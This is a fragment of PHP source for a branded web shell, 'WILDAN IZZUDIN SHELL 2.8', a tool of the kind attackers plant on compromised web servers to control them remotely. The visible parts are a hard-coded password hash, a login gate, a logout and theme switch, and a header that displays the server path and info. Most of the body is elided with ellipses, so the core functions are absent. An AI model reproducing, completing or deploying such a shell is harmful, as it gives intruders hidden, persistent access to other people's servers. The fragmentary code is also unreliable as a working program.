<?php
/*
	WILDAN IZZUDIN SHELL 2.8
	Jayalah Indonesiaku
	(c)2015
	

*/
$s_pass = "e3d0d5e492b8917dbaec81c922a5a83d664c4e7d"; // 
$s_ver = "2.8"; // shell ver
$s_title = "WILDAN IZZUDIN SHELL ".$s_ver; // shell title
...
<?php if($s_auth){?>
	...
	<?php }
	?><a href='<?php echo $s_self; ?>x=logout' title='Click me to log out'>log out</a>  <a href='<?php echo $s_self; ?>x=switch' title='Click me to change theme'><span class='schemabox'>&nbsp;&nbsp;</span></a></span><table id='header'><tr><td style='width:80px;'><table><tr><td><h1><a href='<?php echo $s_self."cd=".cp(dirname(realpath($_SERVER['SCRIPT_FILENAME']))); ?>'>W1LD4N</a></h1></td></tr><tr><td style='text-align:right;'><div class='ver'><?php echo $s_ver; ?></div></td></tr></table></td>	<td><div class='headinfo'><?php echo $s_info; ?></div></td></tr></table></div>
...
<?php } else{ ?>
	...
	W1LD4N <span class='gaya'><?php echo $s_ver; ?></span><input id='login' class='inputz' type='password' name='login' style='width:120px;' value='' />
	<input class='inputzbut' type='submit' value='Go !' name='submitlogin' style='width:80px;' />
	</form>
	</div>
<?php }?>	</td></tr></table>
<p class='footer'>WILDAN IZZUDIN &copy;<?php echo @date("Y",time())." "; ?></p>
